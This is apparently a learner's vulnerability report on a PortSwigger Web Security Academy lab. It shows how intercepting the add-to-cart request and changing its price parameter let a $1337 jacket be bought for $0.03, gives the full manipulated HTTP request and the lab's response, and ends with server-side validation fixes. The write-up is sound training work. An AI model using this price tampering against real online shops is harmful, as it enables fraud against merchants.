#business #business_logic #business_logic_vulnerability 

[[lab excessive trust in client-side controls]]

### **Vulnerability Report Template: Excessive Trust in Client-Side Controls**

**Report ID:** WSAC-2025-001
**Lab Title:** Excessive Trust in Client-Side Controls
**Target:** https://0a5e00f804a7c66c83d128f0008f0011.web-security-academy.net/cart
**Severity:** High
**Reporter:** kaisec
**Date:** 17/10/2025

---

#### **1. Summary**
The website's price functionality doesn't adequately validate user input especially on the price functionality.

#### **2. Vulnerability Details**
**Vulnerability Type:** Insecure Client-Side Validation / Business Logic Bypass
**Affected Component:** The shopping cart specifically the price functionality
**Attack Vector:** Low Privilege User

#### **3. Steps to Reproduce**
**Preconditions:**
*   An authenticated user account: `wiener:peter`
*   Access to a web browser with developer tools.

**Step-by-Step Exploitation:**
1.  Log in using `wiener:peter`
2.  go try to purchase any item below the price of 100 dollars and study the purchase workflow.
3.  now go to the item specified item "Lightweight l33t leather jacket and confirm that you can't purchase the jacket due to insufficient funds"
4.  Now follow the purchase workflow and using burp proxy intercept the request of adding the product and change the price value from 133700 to 3, follow through until you get to the cart.
5.  on the cart finalize the purchase and notice that you can buy the product with 0.03

**Proof of Concept (PoC):**
here are the screenshots and the request details

**Request (After Manipulation):**
```http
POST /cart HTTP/2
Host: 0a5e00f804a7c66c83d128f0008f0011.web-security-academy.net
Cookie: session=EZLX6Y2eDLcMZI6U7oHfyfDJ5oNWpE2W
Content-Length: 44
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="24", "Chromium";v="140"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a5e00f804a7c66c83d128f0008f0011.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5e00f804a7c66c83d128f0008f0011.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

productId=1&redir=PRODUCT&quantity=1&price=3
```

![[Pasted image 20251017043316.png]]

**Response (Successful Bypass):**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 7249

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Excessive trust in client-side controls</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Excessive trust in client-side controls</h2>
                            <a class=link-back href='https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved-hidden>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aExcessive+trust+in+client-side+controls%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-excessive-trust-in-client-side-controls&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2flogic-flaws%2fexamples%2flab-logic-flaws-excessive-trust-in-client-side-controls'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>

            <script src='/resources/labheader/js/completedLabHeader.js'></script>        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <p><strong>Store credit: $79.12</strong></p>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href=/cart>
                                <img src=/resources/images/cart_blue.svg />
                            </a>
                            <p>0</p>
                            <p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <p><strong>Your order is on its way!</strong></p>
                    <table>
                        <tbody>
                            <tr>
                                <th>Name</th>
                                <th>Price</th>
                                <th>Quantity</th>
                                <th></th>
                            </tr>
                            <tr>
                                <td>
                                    <a href=/product?productId=1>Lightweight &quot;l33t&quot; Leather Jacket</a>
                                </td>
                                <td>$1337.00</td>
                                <td>
                                    1
                                </td>
                                <td>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Total:</th>
                                <th>$0.03</th>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

![[Pasted image 20251017043415.png]]

#### **4. Impact**
A successful exploitation of this vulnerability allows an attacker to:
*   **Direct Impact:** The end user can change the price of the product and buy it for less than the set price on the website.
*   **Attack Scenario:** An attacker with minimal-privilege credentials can achieve to proxy the cart request using burp's proxy, change the price value and manage to purchase the product for less than it's initial price.
*   **Business Impact:** This could lead to loss to the company because as you can see on my earlier screenshots and report details, I managed to buy the product sold at $1337$ for $0.03$.

#### **5. Mitigation Recommendations**
The root cause is the server's blind trust in data submitted by the client. To remediate this issue:

*   **Eliminate Client-Side Trust:** Treat all client-side data as untrusted. Client-side controls should be used solely for improving user experience, not for security enforcement.
*   **Implement Server-Side Validation:** Reject any request where critical parameters do not match expected values stored or calculated on the server.
*   **Specific Technical Fix:** For the affected  parameter `productId=1&redir=PRODUCT&quantity=1&price=3`, the server should:
    1.  should check that the parameter above the key and value especially the price key which is saved on the database, should match it exactly since the price should not be changed unless it is done on the backend by the employee.
    2. should not only trust client side validation since it indicates that the developer trusts the user input and this can be circumnavigated using burp's proxy changing it, therefore the developer should do a check from the server logic and confirm the details on the parameter's especially those supposed to be constant are completely throughout the client and backend data transfer.

#### **6. References**
*   OWASP - [Unvalidated Redirects and Forwards](https://owasp.org/www-project-top-ten/2017/A10_2017-Unvalidated_Redirects_and_Forwards) (Related to trusting client-side input)
*   PortSwigger Web Security Academy - [Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)